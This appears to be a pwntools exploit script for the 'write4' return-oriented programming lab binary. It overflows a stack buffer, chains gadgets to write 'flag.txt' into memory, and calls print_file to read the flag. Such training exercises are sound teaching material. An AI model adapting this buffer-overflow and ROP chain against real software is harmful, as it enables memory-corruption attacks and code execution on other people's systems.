from pwn import *

p = process("./write4")
bain = ELF("./write4")

offset = 0x28

write = 0x00400628 # mov [r14], r15; ret
tgt = 0x00601028 # buf
ld_tgt_src = 0x00400690 # pop r14; pop r15; ret
print_file = bain.plt["print_file"]
dummy_ret = 0x00400616
pass_arg = 0x00400693 # pop rdi; ret

payload = b'E'*offset + p64(dummy_ret) + p64(ld_tgt_src) + p64(tgt) + b'flag.txt'
payload += p64(write)
payload += p64(pass_arg) + p64(tgt) + p64(print_file)

with open("payload.bin", 'wb') as f:
    f.write(payload)

# interactive part
p.recvuntil(">")
p.sendline(payload)

p.interactive()
